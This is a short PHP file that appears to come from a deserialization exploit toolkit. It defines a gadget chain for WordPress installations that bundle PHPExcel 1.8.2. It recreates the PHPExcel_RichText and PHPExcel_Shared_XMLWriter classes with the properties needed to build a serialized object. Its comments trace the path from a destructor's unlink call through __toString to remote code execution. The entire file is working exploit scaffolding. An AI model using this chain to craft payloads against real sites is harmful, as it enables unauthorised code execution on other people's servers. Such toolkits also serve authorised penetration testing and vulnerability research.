<?php

require_once(DIR_GADGETCHAINS . '/WordPress/generic/gadgets.php');

# https://github.com/PHPOffice/PHPExcel/blob/1.8.2/Classes/PHPExcel/RichText.php
class PHPExcel_RichText {
    private $richTextElements;

    public function __construct($richTextElements) {
        $this->richTextElements = $richTextElements;
    }

    /*
    public function getPlainText() {
        // Return value
        $returnValue = '';

        // Loop through all PHPExcel_RichText_ITextElement
        foreach ($this->richTextElements as $text) {
            $returnValue .= $text->getText();
        }

        // Return
        return $returnValue;
    }

    public function __toString() {
        return $this->getPlainText();
    }
    */
}

# https://github.com/PHPOffice/PHPExcel/blob/1.8.2/Classes/PHPExcel/Shared/XMLWriter.php
class PHPExcel_Shared_XMLWriter {
    private $tempFileName  = '';

    public function __construct($filePath) {
        $this->tempFileName = $filePath;
    }

    /*
    public function __destruct()
    {
        // Unlink temporary files
        if ($this->tempFileName != '') {
            @unlink($this->tempFileName); // Passing an object will call its __toString(), triggering the RCE
        }
    }
    */
}